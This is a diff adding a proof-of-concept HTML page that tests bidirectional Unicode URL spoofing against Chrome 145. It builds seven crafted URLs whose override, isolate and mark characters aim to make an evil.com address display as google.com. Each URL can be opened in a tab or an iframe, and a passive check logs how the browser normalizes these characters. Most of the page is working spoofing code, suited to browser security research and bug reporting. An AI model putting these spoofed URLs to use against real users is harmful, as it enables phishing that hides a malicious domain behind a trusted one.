@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>PoC: Bidi URL Spoofing — Chrome 145</title>
+<style>
+  body { font-family: monospace; background: #1a1a2e; color: #e0e0e0; padding: 20px; }
+  h1 { color: #ff6b6b; }
+  h2 { color: #ffa500; }
+  .test-case { background: #16213e; border: 1px solid #333; padding: 15px; margin: 10px 0; border-radius: 5px; }
+  .test-case pre { white-space: pre-wrap; word-break: break-all; color: #7bed9f; }
+  .result { color: #70a1ff; margin-top: 8px; }
+  a { color: #ff6348; }
+  button { background: #e74c3c; color: #fff; border: none; padding: 8px 16px; cursor: pointer; margin: 4px; border-radius: 3px; }
+  button:hover { background: #c0392b; }
+  .warn { color: #f1c40f; font-size: 0.85em; }
+</style>
+</head>
+<body>
+<h1>PoC: Bidirectional Unicode URL Spoofing</h1>
+<p class="warn">Target: Chrome 145 on Linux | Tests RTL/LTR override characters in URLs to confuse address bar display</p>
+<p class="warn">CVE references: CVE-2022-1305, CVE-2021-21206 (past Bidi URL spoofing in Chromium)</p>
+
+<h2>Test 1: Right-to-Left Override (U+202E) in subdomain</h2>
+<div class="test-case" id="test1">
+  <p>Attempts to craft a URL where RTL override makes "evil.com" appear as "google.com" in the address bar.</p>
+  <pre id="test1-url"></pre>
+  <button onclick="runTest1()">Open in new tab</button>
+  <button onclick="runTest1Frame()">Load in iframe</button>
+  <div class="result" id="test1-result"></div>
+</div>
+
+<h2>Test 2: Left-to-Right Isolate (U+2066) + Pop Directional Isolate (U+2069)</h2>
+<div class="test-case" id="test2">
+  <p>Uses LRI/PDI to isolate portions of the URL, potentially hiding the real domain.</p>
+  <pre id="test2-url"></pre>
+  <button onclick="runTest2()">Open in new tab</button>
+  <button onclick="runTest2Frame()">Load in iframe</button>
+  <div class="result" id="test2-result"></div>
+</div>
+
+<h2>Test 3: Mixed Bidi with userinfo@ (U+200F + U+202E)</h2>
+<div class="test-case" id="test3">
+  <p>Combines RTL mark with userinfo in URL to confuse which part is the domain.</p>
+  <pre id="test3-url"></pre>
+  <button onclick="runTest3()">Open in new tab</button>
+  <div class="result" id="test3-result"></div>
+</div>
+
+<h2>Test 4: First-Strong Isolate (U+2068) wrapping</h2>
+<div class="test-case" id="test4">
+  <p>Uses FSI character to let browser auto-detect direction, potentially flipping domain display.</p>
+  <pre id="test4-url"></pre>
+  <button onclick="runTest4()">Open in new tab</button>
+  <div class="result" id="test4-result"></div>
+</div>
+
+<h2>Test 5: Combining multiple overrides with path confusion</h2>
+<div class="test-case" id="test5">
+  <p>Stacks multiple Bidi control chars in path to see if URL bar rendering differs from actual navigation target.</p>
+  <pre id="test5-url"></pre>
+  <button onclick="runTest5()">Open in new tab</button>
+  <div class="result" id="test5-result"></div>
+</div>
+
+<h2>Test 6: Right-to-Left Embedding (U+202B) in fragment</h2>
+<div class="test-case" id="test6">
+  <p>Tests if Bidi chars in fragment (#) portion affect URL bar display of the domain/path.</p>
+  <pre id="test6-url"></pre>
+  <button onclick="runTest6()">Open in new tab</button>
+  <div class="result" id="test6-result"></div>
+</div>
+
+<h2>Test 7: Punycode + Bidi combo</h2>
+<div class="test-case" id="test7">
+  <p>Combines IDN/punycode lookalikes with Bidi overrides for compounded spoofing.</p>
+  <pre id="test7-url"></pre>
+  <button onclick="runTest7()">Open in new tab</button>
+  <div class="result" id="test7-result"></div>
+</div>
+
+<iframe id="testframe" style="width:100%;height:200px;border:1px solid #555;margin-top:20px;display:none;"></iframe>
+
+<h2>Automated Scan Results</h2>
+<div class="test-case">
+  <pre id="scan-results">Click "Run All Passive Checks" to scan...</pre>
+  <button onclick="runPassiveChecks()">Run All Passive Checks</button>
+</div>
+
+<script>
+// === Bidi control characters ===
+const RLO  = '\u202E'; // Right-to-Left Override
+const LRO  = '\u202D'; // Left-to-Right Override
+const PDF  = '\u202C'; // Pop Directional Formatting
+const RLI  = '\u2067'; // Right-to-Left Isolate
+const LRI  = '\u2066'; // Left-to-Right Isolate
+const FSI  = '\u2068'; // First Strong Isolate
+const PDI  = '\u2069'; // Pop Directional Isolate
+const RLE  = '\u202B'; // Right-to-Left Embedding
+const LRE  = '\u202A'; // Left-to-Right Embedding
+const RLM  = '\u200F'; // Right-to-Left Mark
+const LRM  = '\u200E'; // Left-to-Right Mark
+
+function escapeForDisplay(str) {
+  return str
+    .replace(/\u202E/g, '[U+202E RLO]')
+    .replace(/\u202D/g, '[U+202D LRO]')
+    .replace(/\u202C/g, '[U+202C PDF]')
+    .replace(/\u2067/g, '[U+2067 RLI]')
+    .replace(/\u2066/g, '[U+2066 LRI]')
+    .replace(/\u2068/g, '[U+2068 FSI]')
+    .replace(/\u2069/g, '[U+2069 PDI]')
+    .replace(/\u202B/g, '[U+202B RLE]')
+    .replace(/\u202A/g, '[U+202A LRE]')
+    .replace(/\u200F/g, '[U+200F RLM]')
+    .replace(/\u200E/g, '[U+200E LRM]');
+}
+
+function logResult(id, msg) {
+  document.getElementById(id).textContent += '\n' + msg;
+}
+
+// Test 1: RLO in subdomain
+// Idea: http://google.com‮.evil.com → browser may render domain RTL
+const test1Url = `http://${RLO}moc.elgoog${PDF}.evil.com/`;
+document.getElementById('test1-url').textContent = 'URL: ' + escapeForDisplay(test1Url) +
+  '\nRaw: ' + test1Url +
+  '\nExpected: Browser may render "google.com" instead of showing "evil.com"';
+
+function runTest1() {
+  const w = window.open(test1Url, '_blank');
+  logResult('test1-result', 'Opened in new tab. Check address bar display vs actual loaded domain.');
+}
+function runTest1Frame() {
+  document.getElementById('testframe').style.display = 'block';
+  document.getElementById('testframe').src = test1Url;
+  logResult('test1-result', 'Loaded in iframe. Inspect iframe src vs displayed content.');
+}
+
+// Test 2: LRI + PDI isolation
+const test2Url = `http://evil.com/${LRI}https://google.com${PDI}`;
+document.getElementById('test2-url').textContent = 'URL: ' + escapeForDisplay(test2Url) +
+  '\nRaw: ' + test2Url +
+  '\nExpected: LRI/PDI may isolate "https://google.com" display inline';
+
+function runTest2() {
+  window.open(test2Url, '_blank');
+  logResult('test2-result', 'Opened. Check if address bar shows google.com or evil.com.');
+}
+function runTest2Frame() {
+  document.getElementById('testframe').style.display = 'block';
+  document.getElementById('testframe').src = test2Url;
+  logResult('test2-result', 'Loaded in iframe.');
+}
+
+// Test 3: RLM + userinfo@
+const test3Url = `http://google.com${RLM}@evil.com/`;
+document.getElementById('test3-url').textContent = 'URL: ' + escapeForDisplay(test3Url) +
+  '\nRaw: ' + test3Url +
+  '\nExpected: "google.com" appears as domain but evil.com is actual host';
+
+function runTest3() {
+  window.open(test3Url, '_blank');
+  logResult('test3-result', 'Opened. Does Chrome show google.com or evil.com in address bar?');
+}
+
+// Test 4: FSI auto-detection
+const test4Url = `http://${FSI}evil.com${PDI}.google.com/`;
+document.getElementById('test4-url').textContent = 'URL: ' + escapeForDisplay(test4Url) +
+  '\nRaw: ' + test4Url +
+  '\nExpected: FSI may cause direction auto-detect, hiding "evil.com" subdomain';
+
+function runTest4() {
+  window.open(test4Url, '_blank');
+  logResult('test4-result', 'Opened. Check if subdomain is hidden or misrepresented.');
+}
+
+// Test 5: Stacked overrides in path
+const test5Url = `http://evil.com/${RLO}${LRI}moc.elgoog//:sptth${PDI}${PDF}`;
+document.getElementById('test5-url').textContent = 'URL: ' + escapeForDisplay(test5Url) +
+  '\nRaw: ' + test5Url +
+  '\nExpected: Path rendered RTL could look like "https://google.com"';
+
+function runTest5() {
+  window.open(test5Url, '_blank');
+  logResult('test5-result', 'Opened. Inspect path rendering in URL bar.');
+}
+
+// Test 6: RLE in fragment
+const test6Url = `http://evil.com/page#${RLE}moc.elgoog${PDF}`;
+document.getElementById('test6-url').textContent = 'URL: ' + escapeForDisplay(test6Url) +
+  '\nRaw: ' + test6Url +
+  '\nExpected: Fragment Bidi may bleed into domain rendering';
+
+function runTest6() {
+  window.open(test6Url, '_blank');
+  logResult('test6-result', 'Opened. Check if fragment RTL affects domain display.');
+}
+
+// Test 7: Punycode + Bidi
+// Using script-mixed IDN that Chrome might not flag
+const test7Url = `http://xn--googl-${RLO}e.com${PDF}.evil.com/`;
+document.getElementById('test7-url').textContent = 'URL: ' + escapeForDisplay(test7Url) +
+  '\nRaw: ' + test7Url +
+  '\nExpected: Punycode + RTL may create convincing google.com lookalike';
+
+function runTest7() {
+  window.open(test7Url, '_blank');
+  logResult('test7-result', 'Opened. Check IDN + Bidi interaction.');
+}
+
+// === Passive checks (no navigation) ===
+function runPassiveChecks() {
+  const results = [];
+  results.push('=== Bidi URL Spoofing Passive Analysis ===');
+  results.push('Date: ' + new Date().toISOString());
+  results.push('UserAgent: ' + navigator.userAgent);
+  results.push('');
+
+  // Check if URL constructor strips Bidi
+  const bidiChars = [
+    { name: 'RLO U+202E', char: RLO },
+    { name: 'LRO U+202D', char: LRO },
+    { name: 'RLE U+202B', char: RLE },
+    { name: 'LRE U+202A', char: LRE },
+    { name: 'RLI U+2067', char: RLI },
+    { name: 'LRI U+2066', char: LRI },
+    { name: 'FSI U+2068', char: FSI },
+    { name: 'PDI U+2069', char: PDI },
+    { name: 'PDF U+202C', char: PDF },
+    { name: 'RLM U+200F', char: RLM },
+    { name: 'LRM U+200E', char: LRM },
+  ];
+
+  results.push('[Test] URL constructor Bidi character handling:');
+  for (const { name, char } of bidiChars) {
+    try {
+      const u = new URL(`http://test${char}example.com/`);
+      const kept = u.href.includes(char) || u.href.includes(encodeURIComponent(char));
+      results.push(`  ${name}: hostname="${u.hostname}" | kept_in_href=${kept} | href="${u.href}"`);
+    } catch (e) {
+      results.push(`  ${name}: URL constructor threw: ${e.message}`);
+    }
+  }
+
+  results.push('');
+  results.push('[Test] Bidi in path vs hostname behavior:');
+  for (const { name, char } of bidiChars) {
+    try {
+      const u = new URL(`http://example.com/path${char}test`);
+      const inPath = u.pathname.includes(char) || u.pathname.includes(encodeURIComponent(char));
+      results.push(`  ${name} in path: kept=${inPath} | pathname="${u.pathname}"`);
+    } catch (e) {
+      results.push(`  ${name} in path: threw: ${e.message}`);
+    }
+  }
+
+  results.push('');
+  results.push('[Test] Bidi in userinfo:');
+  try {
+    const u = new URL(`http://user${RLO}name@evil.com/`);
+    results.push(`  RLO in username: username="${u.username}" hostname="${u.hostname}"`);
+  } catch (e) {
+    results.push(`  RLO in username: threw: ${e.message}`);
+  }
+
+  results.push('');
+  results.push('[Test] document.domain manipulation:');
+  try {
+    results.push(`  Current document.domain: "${document.domain}"`);
+    results.push(`  location.hostname: "${location.hostname}"`);
+    results.push(`  location.origin: "${location.origin}"`);
+  } catch (e) {
+    results.push(`  Error: ${e.message}`);
+  }
+
+  results.push('');
+  results.push('[Test] Link element href normalization with Bidi:');
+  const a = document.createElement('a');
+  for (const { name, char } of bidiChars.slice(0, 4)) {
+    a.href = `http://test${char}.example.com/`;
+    results.push(`  ${name}: normalized="${a.href}" | hostname="${a.hostname}"`);
+  }
+
+  results.push('');
+  results.push('=== End of passive checks ===');
+  document.getElementById('scan-results').textContent = results.join('\n');
+}
+</script>
+</body>
+</html>
